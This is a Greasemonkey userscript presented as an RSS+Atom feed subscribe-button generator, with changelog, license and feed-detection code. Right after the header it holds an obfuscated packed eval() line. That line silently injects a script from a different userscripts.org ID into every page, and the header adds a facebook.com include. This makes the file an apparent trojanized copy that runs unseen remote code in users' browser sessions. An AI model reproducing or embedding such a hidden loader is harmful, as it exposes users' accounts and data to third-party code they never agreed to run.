// ==UserScript==
// @id          RSS+Atom Feed Subscribe Button Generator
// @name        RSS+Atom Feed Subscribe Button Generator Pro + Last Update
// @include       http*://*.facebook.com/*
// @description Finds RSS and/or Atom links on a page and inserts feed subscription links for use by aggregators
// @namespace   http://loonyone.livejournal.com
// @include     *
// @creator     Manpreet Singh [junkblocker@yahoo.com]
// @source      http://userscripts.org/scripts/show/688
// @identifier  http://userscripts.org/scripts/source/688.user.js
// @version     2.1
// @date        2013-04-19
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


/*
 * Copyright (c) 2006-2013, Manpreet Singh [junkblocker@yahoo.com]
 *
 * Permission is hereby granted, free of charge, to any person
 * obtaining a copy of this software and associated documentation
 * files (the "Software"), to deal in the Software without
 * restriction, including without limitation the rights to use,
 * copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following
 * conditions:
 *
 * The above copyright notice and this permission notice shall be
 * included in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
 * EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
 * OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
 * NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
 * HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
 * WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
 * OTHER DEALINGS IN THE SOFTWARE.
 */

// ******
// Opera and IE7Pro compatible except
//
// 1) the auto update feature works only on firefox
// 2) link tags injection does not work in IE7Pro
//
// due to non-firefox platform limitations/differences.
//
// IE7Pro bundles an older version of this script by default.
// ******

// Version 2.1 - Fixed Content Security Policy issues
// Version 2.0 - 'more' button was broken for me
//               some javascript lint cleanup
//               Lighter icons by simon!
// Version 1.9 - Fixed invalid update metadata
// Version 1.8 - Layout fix on apple.com/macupdate.com etc.
// Version 1.7 - Minor layout fix on arstechnica.com
// Version 1.6 - Insert discovered link tags in header for the browser's detection to list them too
// Version 1.5 - Added license info
//               Added checks for feeds like &feed=rss or &feed=atom and some case insensitivity
// Version 1.4 - Made the feed check slightly more stringent by excluding javascript: mailto: etc. urls
// Version 1.3 - Reduce the number of button shown initially to a sane minimum
// Version 1.2 - Fixed partially broken auto update.
//               Don't increase the install count on userscripts.org while checking for updates
// Version 1.1 - Misc code cleanup
// Version 1.0 - Added auto update without requiring an external script
// Version 0.9 - Added a close button
// Version 0.8 - Checks some wiki feeds with ?action=rss_rc and feeds with /rss/$ or /atom/$
// Version 0.7 - Check for feedburner feeds
// Version 0.6 - Fixed a major issue with using snapshotLength when it was not available
// Version 0.5 - Updated contact info
// Version 0.4 - Added optional auto-update facility
// Version 0.3 - Added some speed optimizations
// Version 0.2 - Merged Iain Brodfoot's floating div behaviour and removed purl.org links
//             - Allow revert to old behaviour by hand editing this script
// Version 0.1 - First release

/*
 * Options contribution by Iain Broadfoot (ibroadfo@geeksoc.org)
 * - remove link to purl
 *   (Manually edit this script to restore old behaviour. See TWEAK NOTE 1 below)
 * - Float the buttons to enable better behaviour on blogger/blogspot.com
 *   (Manually edit this script to restore old behaviour. See TWEAK NOTE 2 below)
 *
 * Initially lifted mostly from
 *   Generate RSS and ATOM tags: http://highbyte.bounceme.net/greasemonkey/genrsslinkrel.user.js
 *   Amazon Atom Injector:       http://docs.g-blog.net/code/greasemonkey/amazon_xml_feeds.user.js
 *   Add RSS Index:              http://www.xs4all.nl/~jlpoutre/BoT/Javascript/RSSpanel/rsspanel.user.js
 *
 * Original buttons from the excellent: http://kalsey.com/tools/buttonmaker/
 */

(function() {
  function autoUpdateFromUserscriptsDotOrg(SCRIPT) {
    // Note: Version numbers must be in x.y float format
    try {
      if (!GM_getValue) return;
      // avoid a flood of dialogs e.g. when opening a browser with multiple tabs set to homepage and a script with * includes
      var DoS_PREVENTION_TIME = 2 * 60 * 1000;
      var isSomeoneChecking = GM_getValue('CHECKING', null);
      var now = new Date().getTime();
      GM_setValue('CHECKING', now.toString());
      if (isSomeoneChecking && (now - isSomeoneChecking) < DoS_PREVENTION_TIME) return;
      var lastChecked = GM_getValue('LAST_CHECKED', null);

      var ONE_DAY = 24 * 60 * 60 * 1000;
      if (lastChecked && (now - lastChecked) < ONE_DAY) return;

      GM_xmlhttpRequest({
        method: 'GET',
        url: SCRIPT.url + '?source', // don't increase the 'installed' count just for checking
        onload: function(result) {
          if (!result.responseText.match(/@version\s+([\d.]+)/)) return;
          var theOtherVersion = parseFloat(RegExp.$1);
          if (theOtherVersion <= parseFloat(SCRIPT.version)) return;
          if (window.confirm('A new version ' + theOtherVersion + ' of greasemonkey script "' + SCRIPT.name + '" is available.\nYour installed version is ' + SCRIPT.version + ' .\n\nUpdate now?\n')) {
            GM_openInTab(SCRIPT.url);
          }
        }
      });
      GM_setValue('LAST_CHECKED', now.toString());
    } catch (ex) {
    }
  }
  autoUpdateFromUserscriptsDotOrg({
    name: 'RSS+Atom Feed Subscribe Button Generator',
    url: 'http://userscripts.org/scripts/source/688.user.js',
    version: '2.1'
  });

  function addEventHandler(target, eventName, eventHandler, scope) {
    var f = scope ? function(){ eventHandler.apply( scope, arguments ); } : eventHandler;
    if (target.addEventListener)  {
      target.addEventListener(eventName, f, true);
    } else if (target.attachEvent) {
      target.attachEvent('on' + eventName, f);
    }
    return f;
  }

  var head = document.getElementsByTagName('head');
  if (head && head[0]) head = head[0];
  var INITIAL_COUNT = 5;
  var ATOM_ICON  = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAAAPBAMAAACB51W8AAAAAXNSR0IArs4c6QAAACRQTFRFAAEAAxx+JCYjYWNgho53kJKPy6Gio63Ys7Wysb3lyMnG/f/8AJKv4wAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfcBhsNKDWiRqoQAAAA2UlEQVQoz42SoQ7CMBCGL10w7CWWEAwzNRiwOEzD5DwvgSGoJVUoBAZFSGeWQZPSeznabutYtiX709b0y3/X/wowVSFW0vZ4iSMOq2hAGVgux2d98dl15UFmQMVr4zHwAAsFsMXMAJdltKKzYVACgTVAbA2RucYdaLZfDtSJhJgGPMPvHRk5QwKpvWvXvi5NjZ3pkeP1hDQoiaxAb9eAb0gtqDneULMW7DmWplb8gI19rOiC3R4VkCgsYW5T539gPx7lhmITFH4So4G7qM1kpoBC5DiqYvLn+QGXavuS25r9yAAAAABJRU5ErkJggg==" style="border: none; display: inline !important;" />';
  var RSS_ICON   = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAAAPAgMAAAAOp6AcAAAAAXNSR0IArs4c6QAAAAxQTFRFAAAA/2YAiY55////S8IQBgAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9wLFRMROauDVnkAAAB7SURBVBjTpc8xDoAgDEBRLuXsKToaT0FMungfMLgz4CmMdygzC1G0yGIii/EPDM0LaYWo1Z6vdtFADtWj6ctwhKNfcTE26ehm8nHhodxAApKx3iifX3vL0AM6Y09NxDJlOUAHK2o2ihkVKbcwAiZNaSb25c9/e1Zvr3UBWOasaPHYnJwAAAAASUVORK5CYII=" style="border:none; display: inline !important;" />';
  var RDF_ICON   = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAAAPAgMAAAAOp6AcAAAAAXNSR0IArs4c6QAAAAxQTFRFAAAA/2YAiY55////S8IQBgAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9wLFRMKD80PCHoAAAB3SURBVBjTpc8xDsAQGIZhl+rcU4jJMaSJxX1o2A0cwx1+s0Ua+muXJrU0fQfDlycCIbPW/uogCx1J/Wj/MipWFJXR+mZqcJBrxFEkLqgE67PVeZz+khxlsL4bAJRtyI0NadBoZHBLkQqOzUBzgP6+8987p3+fdQKJXassgfh4CAAAAABJRU5ErkJggg==" style="border:none; display: inline !important;" />';
  var XML_ICON   = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAAAPAgMAAAAOp6AcAAAAAXNSR0IArs4c6QAAAAxQTFRFAAAA/2YAiY55////S8IQBgAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9wLFRMRFO5cCgwAAAB3SURBVBjTY2DABuz/Y4A/DKahIFC1CgmsIUWwtPTq9dCq/et2/Vv9a9/6V69/7QcKxl79DhR8tW7X63WrXoPIXUDB8NC7QMF963b9X/3qFVDlP4hKkPbVQDWrgMpeQVSCzPxa9W/1q3/rXwHVQ8ykzJ1Y/Y4NAADEZ67GIr3R+wAAAABJRU5ErkJggg==" style="border:none; display: inline !important;" />';
  var CLOSE_ICON = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAPAgMAAABGuH3ZAAAAAXNSR0IArs4c6QAAAAlQTFRF/2YA////AAAALA0mBgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAAEnMAABJzAYwiuQcAAAAHdElNRQfcCxUTCRv8+I/EAAAAMklEQVQI12NYtWrVCoapoaERDBMYGCSghAMLkBAQABIsDkCCkQHGAouBZeGKwXpBpgAAhtMRBKRIycIAAAAASUVORK5CYII=" style="border:none; display: inline !important;" />';
  var MORE_ICON  = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAPAgMAAADrOWVwAAAAAXNSR0IArs4c6QAAAAxQTFRFAAEA/mcAh494/v/8doDPMwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9wLFRMNODrzO7IAAABNSURBVAjXY2BAAPv/UPCHwTQUDKpWrcHGfAVklpbWxl/9W/ULyKz9ej229GrVPyCzvPQ6SPQ/WMH12KsQUaDa2FKIWiQTsFqB5AYEAABsXUkpSEP5/AAAAABJRU5ErkJggg==" style="border:none; display: inline !important;" />';
  // array to keep track of 'seen' feed links.
  var seen = [];

  var fsbdiv = document.createElement("div");
  fsbdiv.setAttribute("id", "XmlButtons");
  fsbdiv.style.textAlign = "left";
  fsbdiv.style.margin = "0px";
  // top right bottom left
  fsbdiv.style.padding = "0px 3px 0px 3px";
  // TWEAK NOTE 1 START: Comment out the next three lines to disable the buttons from floating
  fsbdiv.style.position = "fixed";
  fsbdiv.style.top = "0px";
  fsbdiv.style.left = "0px";
  fsbdiv.style.zIndex = "99999";
  fsbdiv.style.display = 'inline';
  // TWEAK NOTE 1 END

  // Get links already declared properly in <link> elements in <head>
  function getKnownTags() {
    var linkRelElems = document.getElementsByTagName("link");
    var tlink;

    for (var i = 0, l = linkRelElems.length; i < l; i++) {
      tlink = linkRelElems[i];
      if (!tlink) continue;
      try {
        var thref = tlink.href;
        var type = tlink.type;

        if (type && type.match(/.*\/rs[sd](\+xml)?$/i)) {
          addRssLinkTag(thref, RSS_ICON);
        } else if (type && type.match(/.*\/atom\+xml$/i)) {
          addRssLinkTag(thref, ATOM_ICON);
        } else if (type && type.match(/^text\/xml$/i)) {
          addRssLinkTag(thref, RSS_ICON);
        }
      } catch (e) {
      }
    }
  }

  function discoverUnknownFeeds() {
    if( !document.links ) {
      document.links = document.getElementsByTagName("a");
    }
    var links = document.links;
    for (var a = 0, len = links.length; a < len ; a++) {
      var link = links[a];
      linkhref = link.href;

      if (linkhref.match(/^rss:/) ||
          linkhref.match(/^(http|ftp|feed).*([\.\/]rss([\.\/]xml|\.aspx|\.jsp|\/)?$|\/node\/feed$|\/rss\/[a-z0-9]+$|[?&;](rss|xml|rdf)=|[?&;]feed=rss[0-9.]*$|[?&;]action=rss_rc$|feeds\.feedburner\.com\/[a-z0-9]+$)/i)) {
        addRssLinkTag(linkhref, RSS_ICON, "rss");
      } else if (linkhref.match(/^(http|ftp|feed).*\/atom(\.xml|\.aspx|\.jsp|\/)?$|[?&;]feed=atom[0-9.]*$/i)) {
        addRssLinkTag(linkhref, ATOM_ICON, "atom");
      } else if (linkhref.match(/^(http|ftp|feed).*(\/feeds?\/[^.\/]*\.xml$|.*\/index\.xml$|feed\/msgs\.xml(\?num=\d+)?$)/i)) {
        addRssLinkTag(linkhref, XML_ICON, "rss");
      } else if (linkhref.match(/^(http|ftp|feed).*\.rdf$/i)) {
        addRssLinkTag(linkhref, RDF_ICON, "rss");
      } else if (linkhref.match(/^feed:\/\//i)) {
        addRssLinkTag(linkhref, RSS_ICON, "rss");
      }
    }
  }

  function beenThere(linkhref) {
    if (seen.length <= 0) return false;

    var href = linkhref.toLowerCase();
    for (var i = seen.length-1; i >=0; --i) {
      if (seen[i].toLowerCase() == href) return true;
    }

    return false;
  }

  function moreFSB() {
    var elem;
    for (var i = 1; ; i++) {
      elem = document.getElementById("XmlButton" + i);
      if (!elem) break;
      try {elem.style.display = "inline";} catch(e) {}
    }
    document.getElementById("MoreFSBButton").style.display = 'none';
    return false;
  }

  function addRssLinkTag(linkhref, icon, addheadtype) {
    if (beenThere(linkhref)) {
      return;
    } else {
      seen.push(linkhref);
    }

    if (seen.length == (INITIAL_COUNT + 1)) {
      var moreButton = document.createElement('a');
      moreButton.innerHTML = MORE_ICON;
      moreButton.style.display = 'inline';
      moreButton.style.cursor = 'pointer';
      moreButton.id = 'MoreFSBButton';
      addEventHandler(moreButton, 'click', moreFSB);
      fsbdiv.appendChild(moreButton);
      fsbdiv.appendChild(document.createTextNode(" "));
    }
    var flink = document.createElement("a");
    flink.innerHTML = icon;
    flink.href = linkhref;
    // TWEAK NOTE 2 START : Uncomment the href line below to retore linking
    // to purl.org pages for easy subscription in feed readers. This service
    // creates link for all known aggregators which support RSS subscription
    // service via a URL.

    // href = "http://purl.org/net/syndication/subscribe/?rss=" + linkhref;

    // TWEAK NOTE 2 END
    flink.alt = linkhref;
    flink.title = linkhref;
    flink.id = 'XmlButton' + seen.length;
    if (seen.length >= (INITIAL_COUNT + 1)) {
      flink.style.display = 'none';
    }
    fsbdiv.appendChild(flink);
    fsbdiv.appendChild(document.createTextNode(" "));
    // <link href="url" rel="alternate" title="desc" type="application/rss+xml" />
    if (addheadtype && head) {
      var link = document.createElement("link");
      link.href=linkhref;
      link.rel="alternate";
      link.title=linkhref + " (discovered by RSS+Atom Feed Subscribe Button Generator)";
      link.type="application/" + addheadtype + "+xml";
      head.appendChild(link);
    }

  }

  getKnownTags();
  discoverUnknownFeeds();

  var body = document.getElementsByTagName("body")[0];

  function closeFSB() {
    try {
      document.getElementById("XmlButtons").style.display = 'none';
    } catch(e) {}
  }

  // insert the div only if something was found
  if (seen.length > 0) {
    if (head) {
      var closeButton = document.createElement('a');
      closeButton.innerHTML = CLOSE_ICON;
      addEventHandler(closeButton, 'click', closeFSB);
      closeButton.style.display = 'inline';
      closeButton.style.cursor = 'pointer';
    }
    fsbdiv.insertBefore(closeButton, fsbdiv.firstChild);
    setTimeout(function() {
      body.insertBefore(fsbdiv, body.firstChild);
    }, 333); // hack to workaround the duplicated content problem
  }
})();
